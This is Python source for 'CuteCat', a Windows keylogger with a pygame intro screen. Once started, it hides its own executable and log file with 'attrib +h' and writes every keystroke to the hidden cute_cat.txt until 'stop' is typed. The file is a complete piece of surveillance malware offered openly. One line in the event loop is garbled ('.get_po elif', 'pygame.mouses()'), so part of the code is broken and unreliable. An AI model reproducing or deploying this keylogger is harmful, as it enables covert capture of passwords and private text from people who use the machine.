import datetime
from pynput import keyboard
from sys import exit
from os import system
import pygame
session_time=datetime.datetime.now()
pygame.init()
pygame.font.init()
icon=pygame.image.load(r"C:\\Users\\user\\Desktop\\keylogger_project\\cute_cat.ico")
pygame.display.set_icon(icon)
pygame.display.set_caption("CuteCat")
width=800
height=600
running=True
window=pygame.display.set_mode((width,height))
font=pygame.font.Font(None,25)
button_font=pygame.font.Font(None,40)
background_color=(0,0,0)
button_color=(0,0,0)
button_background=(160,32,240)
window.fill(background_color)
red=(255,0,0)
green=(0,255,0)
blue=(0,0,255)
def display_text(text,position,color):
    text=font.render(text,True,color,background_color)
    rect=text.get_rect()
    rect.topleft=position
    window.blit(text,rect)
    pygame.display.flip()
text1="This is CuteCat:windows internal keylogger"
text2="It will store pressed keys in the hidden file cute_cat.txt"
text3="Starting the keylogger will also make the program invisible"
text4="To stop the keylogger type stop anywhere and then press enter"
text5="After stopping the keylogger ,to make it visible again type the command :"
text6="attrib -h cute_cat.exe after you went in the keylogger folder [in cmd]"
text7="To unhide the cute_cat.txt file do the same as before just attrib -h cute_cat.txt"
texts=[text1,text2,text3,text4,text5,text6,text7]
col="red"
y=10
x=10
col="blue"
nested_running=True
for i in texts:
    y+=25
    display_text(i,(x,y),col)
    if col==red:
        col=green
    elif col==green:
        col=blue
    else:
        col=red
    pygame.display.flip()
    while nested_running:
        for event in pygame.event.get():
            if event.type==pygame.KEYDOWN:
                nested_running=False
                break
            .get_po            elif event.type==pygame.MOUSEBUTTONDOWN:
                k_pos=pygame.mouses()
                for i in range(width):
                    for j in range(height):
                        if i==k_pos[0] and j==k_pos[1]:
                            nested_running=False
                            break
            elif event.type==pygame.QUIT:
                running=False
                break
    nested_running=True
pygame.draw.rect(window,green,[width//2-110,height//2-20,230,63])
button_text="Start CuteCat"
button_text=button_font.render(button_text,True,button_color,green)
button_rect=button_text.get_rect()
button_rect.topleft=(width//2-100,height//2)
window.blit(button_text,button_rect)
pygame.draw.rect(window,blue,[width//2-110,height//2-20,230,63],2)
pygame.display.flip()
running=True
del nested_running
start_program=False
while running:
    for event in pygame.event.get():
        if event.type==pygame.QUIT:
            running=False
            exit()
        elif event.type==pygame.MOUSEBUTTONDOWN:
            click_pos=pygame.mouse.get_pos()
            for i in range(291,518):
                for j in range(277,342):
                    if i==click_pos[0] and j==click_pos[1]:
                        start_program=True
                        running=False
                        break
if start_program==True:
    pygame.quit()
    file=open("cute_cat.txt","a")
    file.write("\n\n")
    file.write(f"---------------------------New--Cat---[{session_time}]------------------------------------")
    file.write("\n\n")
    file.close()
    del file
    system("attrib +h cute_cat.exe")
    # Buffer to keep track of keys
    buffer = []
    stop_sequence = "stop"
    system("attrib +h cute_cat.txt")
    def keyPressed(key):
        global buffer
        print(str(key))
        with open("cute_cat.txt", "a") as logKey:
            #system("attrib +h cute_cat.txt")
            try:
                char = key.char
                if char:
                    logKey.write(char)
                    buffer.append(char)
            except AttributeError:
                # Handle special keys
                if key == keyboard.Key.enter:
                    logKey.write('\n')
                    # Check if the stop sequence is in the buffer
                    if "".join(buffer[-len(stop_sequence):]) == stop_sequence:
                        listener.stop()
                        print("Logging stopped.")
                else:
                    special_key = f'[{key}]'
                    logKey.write(special_key)
                    buffer.append(special_key)
            except Exception as e:
                print(f"An error occurred: {e}")
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    listener.join()
